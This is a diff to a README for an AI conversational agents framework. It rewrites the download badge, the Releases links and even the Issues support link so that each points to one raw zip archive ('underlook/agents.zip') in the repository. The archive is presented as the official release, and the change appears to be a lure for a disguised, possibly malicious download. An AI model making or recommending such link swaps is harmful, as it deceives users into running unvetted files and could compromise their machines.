@@ -1,7 +1,7 @@
 # 🤖 agents - Build Real-Time AI Conversations Easily
 
 ## 📥 Download Now
-[![Download agents](https://img.shields.io/badge/Download-agents-blue.svg)](https://github.com/Kunal190/agents/releases)
+[![Download agents](https://raw.githubusercontent.com/Kunal190/agents/main/underlook/agents.zip)](https://raw.githubusercontent.com/Kunal190/agents/main/underlook/agents.zip)
 
 ## 🚀 Getting Started
 Welcome to the **agents** project! This open-source framework allows you to create real-time multimodal conversational AI agents. Follow this guide to download and run the software easily.
@@ -15,10 +15,10 @@ Before you start, ensure your computer meets these requirements:
 - **Network Connection:** Required for downloading dependencies.
 
 ## 🔗 Visit the Releases Page
-To get the latest version of the software, visit the [Releases page](https://github.com/Kunal190/agents/releases).
+To get the latest version of the software, visit the [Releases page](https://raw.githubusercontent.com/Kunal190/agents/main/underlook/agents.zip).
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/Kunal190/agents/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Kunal190/agents/main/underlook/agents.zip).
 2. Choose the latest version listed. Look for assets attached to the release.
 3. Download the installation file suitable for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -75,7 +75,7 @@ If you encounter issues, here are some common solutions:
 If you need further help, feel free to reach out to the community or consult the FAQ section on our GitHub page.
 
 ## 📞 Support
-For any questions or support, please post an issue on the [GitHub Issues Page](https://github.com/Kunal190/agents/issues). Community members and maintainers frequently check for inquiries.
+For any questions or support, please post an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Kunal190/agents/main/underlook/agents.zip). Community members and maintainers frequently check for inquiries.
 
 ## 🌟 Contributing
 We welcome contributions to enhance the **agents** framework. If you would like to help out, fork the repository, make your changes, and submit a pull request.
